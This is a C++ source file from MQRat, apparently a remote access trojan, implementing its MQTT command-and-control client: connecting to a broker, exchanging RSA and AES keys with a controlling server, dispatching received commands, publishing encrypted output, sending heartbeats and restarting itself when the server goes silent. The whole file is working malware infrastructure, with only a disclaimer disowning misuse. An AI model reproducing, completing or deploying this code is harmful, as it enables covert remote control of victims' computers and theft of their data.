/*
	This file is part of MQRat.
	
	Copyright (C) 2019  MQRat Project

	O autor não se responsabiliza por variantes (ou sources originais) deste software 
	que estejam sendo utilizadas para prejudicar terceiros.
*/

#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#include <thread>
#include <functional>
#include <windows.h>
#include <openssl/rsa.h>
#include "paho/include/MQTTClientPersistence.h"
#include "command_dispatcher.hpp"
#include "mqtt_client.hpp"
#include "utils.hpp"
#include "log.hpp"
#include "command_dispatcher.hpp"
#include "wrappers.hpp"
#include "encoders/base64.hpp"
#include "rsa.hpp"
#include "key_manager.hpp"

using namespace std;

MqttClient::MqttClient() {
	this->qos = 0;
    this->client = nullptr;
    this->broker_host = "127.0.0.1";
    this->reconnect_timeout = 5000;
    this->client_id = Utils::GenerateID();
    dispatcher = new CommandDispatcher(nullptr, this, nullptr);
    manager = new KeyManager();

    this->bPublicKeySaved.store(false);
    this->bHeartbeatReceived.store(false);
}

MqttClient::MqttClient(unsigned qos_level, string broker_hostname) : MqttClient() {
	this->qos = qos_level;
    this->broker_host = broker_hostname;
}

MqttClient::MqttClient(unsigned qos_level, string broker_hostname, Crypto::RSACipher *cipher, string id) : MqttClient() {
	this->qos = qos_level;
    this->broker_host = broker_hostname;
    this->cipher = cipher;
    this->client_id = id;
}

MqttClient::~MqttClient() {
    Log::LogInfo("MQTT client finished");
    MQTTClient_free(this->client);
    delete manager;
    delete static_cast<CommandDispatcher*>(dispatcher);
}

bool MqttClient::Setup() {
	string client_id = Utils::GenerateID().c_str();

	Log::LogInfo("Setting up client to connect with: " + this->broker_host);
	Log::LogInfo("Client id: " + client_id);

    // Create MQTT client
    auto status = MQTTClient_create(&client, this->broker_host.c_str(), client_id.c_str(), MQTTCLIENT_PERSISTENCE_NONE, NULL);
    if(status != MQTTCLIENT_SUCCESS) {
        Log::LogPanic("Failed to create MQTT client: %s", MQTTClient_strerror(status));
    }

    // Configure callbacks
    auto c = MQTTClient_setCallbacks(client, this, Wrappers::onLost, Wrappers::onMsgReceived, Wrappers::onDelivered);
    if(c != MQTTCLIENT_SUCCESS) {
        Log::LogPanic("Failed to setup callbacks: %s", MQTTClient_strerror(c));
    }

    return true;
}


void MqttClient::Subscribe(string topic) {
	int status;

	Log::LogInfo("Subscribing to topic: " + topic);
	if((status = MQTTClient_subscribe(client, topic.c_str(), this->qos)) != MQTTCLIENT_SUCCESS) {
		Log::LogPanic("Failed to subscribe: %s", MQTTClient_strerror(status));
	}
}

void MqttClient::Subscribe(char* const* topics, int *qos, int len) {

    auto status = MQTTClient_subscribeMany(client, len, topics, qos);

    if(status != MQTTCLIENT_SUCCESS) {
        Log::LogPanic("Failed to subscribe to multiple topics: %s", MQTTClient_strerror(status));
    }
}

void MqttClient::ConfigureOptions(void *m_options) {
    auto options = static_cast<MQTTClient_connectOptions*>(m_options);
    options->MQTTVersion = MQTTVERSION_3_1_1;
    options->connectTimeout = 10;
    options->cleansession = 0;
}

void MqttClient::Connect() {
    MQTTClient_connectOptions options = MQTTClient_connectOptions_initializer;

    // Try connect with broker
    if(client != NULL) {
        this->ConfigureOptions(&options);
		auto connect_status = MQTTClient_connect(client, &options);
        if(connect_status != MQTTCLIENT_SUCCESS) {
            Log::LogPanic("Failed to connect with broker: %s", MQTTClient_strerror(connect_status));
        }
		
		Log::LogInfo("Connected with " + broker_host);
    }
}

void MqttClient::Loop() {
    while(true) {
		//MQTTClient_yield();
        Sleep(this->yield_delay_ms);
    }
}

void MqttClient::Publish(string data, string topic, unsigned QoS, bool retained) {
	MQTTClient_deliveryToken token;
	auto delivery_timeout = 5000UL;
	
	if(topic.empty()) {
		Log::LogError("Empty topic name passed to publish function");
		return;
	}
	
	// Publishes the message
	MQTTClient_publish(client, topic.c_str(), data.length(), 
                    reinterpret_cast<const void*>(data.c_str()), QoS, retained, &token);

	// Wait for message delivery
	auto status = MQTTClient_waitForCompletion(client, token, delivery_timeout);	
    if(status != MQTTCLIENT_SUCCESS) {
        Log::LogError("Failed to publish data: %s", MQTTClient_strerror(status));
        return;
    }

	Log::LogInfo("%u bytes published to topic %s", data.length(), topic.c_str());
}

void MqttClient::Publish(string data, string topic) {
    return Publish(data, topic, this->qos, false);
}

void MqttClient::Publish(vector<string> data, string topic)
{
    string payload = "";

    for(const auto& output : data) {
        payload += output + "\n";
    }

    // Publish to topic
    return this->Publish(payload, topic);
}

MQTTClient MqttClient::GetClient() {
    return client;
}

void MqttClient::OnConnectionLost(void *context, char *cause) {
    Log::LogError("Connection lost with broker. Reconnecting");
    Sleep(reconnect_timeout);
    this->Connect();
}

void MqttClient::SaveRSAPk(MQTTClient_message *message)
{
    // Allocate memory to store payload
    auto needed_memory = (message->payloadlen + 1) * sizeof(char);
    auto pub_key = new char[needed_memory];

    // Write public key to buffer
    auto pub_key_len = snprintf(pub_key, needed_memory, "%s", (char*)message->payload);

    if(pub_key_len <= 0) {
        throw std::runtime_error("snprintf could not write data to buffer");
    }

    // Save public key
    manager->SavePublicKey(pub_key, needed_memory);
    bPublicKeySaved.store(true);

    Log::LogInfo("Public key saved");

    // Setup RSA Context
    cipher->LoadPublicKey(pub_key, pub_key_len);

    // Free memory used
    delete[] pub_key;

    static_cast<CommandDispatcher*>(dispatcher)->Prepare();
}

int MqttClient::OnMessageReceived(void *context, char *topic, int topic_len, MQTTClient_message *message) {
    
    if(IsBadReadPtr(topic, sizeof(topic))) {
        Log::LogPanic("Invalid pointer detected");
    }

    Log::LogInfo("Message received on topic " + string(topic));

    // Check if is the handshake message
    auto hs_topic = "/" + topics[MQTT_TOPIC_HANDSHAKE].Name;

    if(string(topic).find(hs_topic) != string::npos) 
    {
        // Handles the handshake payload
        HandleHandshake(message);

        // Free resources
        MQTTClient_freeMessage(&message);
        MQTTClient_free(topic);

        return 1;
    }

    auto dp = static_cast<CommandDispatcher*>(dispatcher);

    // Dispatch received command
    dp->setMessage(message);
    dp->setTopic(const_cast<char*>(getSendTopic().c_str()));
    dp->Dispatch();

    // Free memory
    MQTTClient_freeMessage(&message);
    MQTTClient_free(topic);

	return 1;
}

void MqttClient::OnDelivered(void* context, MQTTClient_deliveryToken dt) {

}

void MqttClient::setSendTopic(std::string new_topic)
{
    this->send_topic = new_topic;
}

string MqttClient::getSendTopic()
{
    return this->send_topic;
}

void MqttClient::SendHeartbeat()
{
    const auto qualityOfService = 2;

    Publish(this->heartbeat_payload, getHeartbeatTopic(), qualityOfService, false);

    // Stores the time
    uHeartbeatStartTime.store(GetTickCount());
}

string MqttClient::getRecvTopic()
{
    return this->recv_topic;
}

void MqttClient::setRecvTopic(string new_topic)
{
    this->recv_topic = new_topic;
}

void MqttClient::setHeartbeatTopic(string new_topic)
{
    this->heartbeat_topic = new_topic;
}

string MqttClient::getHeartbeatTopic()
{
    return this->heartbeat_topic;
}

void MqttClient::SendErrorEncrypted(Crypto::RSACipher *cipher)
{
    this->Publish("/error", this->getSendTopic());
}

void MqttClient::SendError()
{
    this->Publish("/error", this->getSendTopic());
}

void MqttClient::PublishEncrypted(string data, string topic)
{
    // Encrypt payload
    auto payload = cipher->Encrypt(data.c_str(), data.length());

    // Publish encrypted payload
    if(payload != NULL)
        this->Publish(payload, topic);
    else
        SendError();
    
    // Free memory
    delete payload;
}

void MqttClient::PublishEncrypted(vector<string> data, string topic)
{
    string payload = "";

    // Insert a new line character between elements
    for(auto c : data) {
        payload += c;
        payload += "\n";    
    }

    return PublishEncrypted(payload, topic);
}

Crypto::RSACipher *MqttClient::getCipher()
{
    return this->cipher;
}

void MqttClient::setHandshakeTopic(string topic)
{
    this->handshake_topic = topic;
}

KeyManager *MqttClient::GetKeyManager() 
{
    return this->manager;
}

void MqttClient::setSymetricCipher(Crypto::AESCipher *cipher)
{
    this->aes_cipher = cipher;
}

void MqttClient::SendSymmetricKey(MQTTClient_message *message)
{
    // Send symetric key to server
    auto iv = aes_cipher->GetIV();
    auto key = aes_cipher->GetKey();

    // Encode sk packet
    auto header = Utils::ToHex("/sk");
    auto hex_iv = Utils::ToHex(iv, AES_BLOCK_SIZE);
    auto hex_key = Utils::ToHex(key, aes_cipher->GetKeySize());

    auto full_size = strlen(header) + strlen(hex_iv) + strlen(hex_key) + 1;
    auto payload = new char[full_size];

    if((snprintf(payload, full_size, "%s%s%s", header, hex_iv, hex_key)) <= 0) {
        throw std::runtime_error("snprintf failed to build sk payload");
    }

    // Publish symetric keys to topic
    PublishEncrypted(payload, send_topic);

    // Free memory
    delete[] header;
    delete[] hex_iv;
    delete[] hex_key;
    delete[] payload;

    Log::LogInfo("Symmetric key sent to server (%u bytes)", full_size + RSA_size(cipher->GetRSAContext()));
}

void MqttClient::HandleHandshake(MQTTClient_message *message)
{
    if(!bPublicKeySaved.load()) 
    {
        try 
        {
            // Save public key into disk
            SaveRSAPk(message);

            // Send symmetric key to server
            SendSymmetricKey(message);

            // All handshake process has been completed
            bHeartbeatReceived.store(true);

        } catch(std::runtime_error& e) 
        {
            Log::LogPanic("Failed to save public key: %s", e.what());
        } catch(std::bad_alloc& b) {
            Log::LogPanic("Failed to save public key: %s", b.what());
        }
    }
}

void MqttClient::CheckHandshake()
{
    Log::LogInfo("Waiting server to acnowledge the handshake request");

    while(!bHeartbeatReceived.load())
    {
        auto now = GetTickCount();

        // If timeout exceeded
        if((now - uHeartbeatStartTime.load()) > HB_RESPONSE_TIMEOUT) {
            Log::LogError("Timeout to receive heartbeat from server has been exceeded");

            // Restart application
            Utils::RestartCurrentApplication(5);
        }
    }

    Log::LogInfo("Handshake request responded");
}
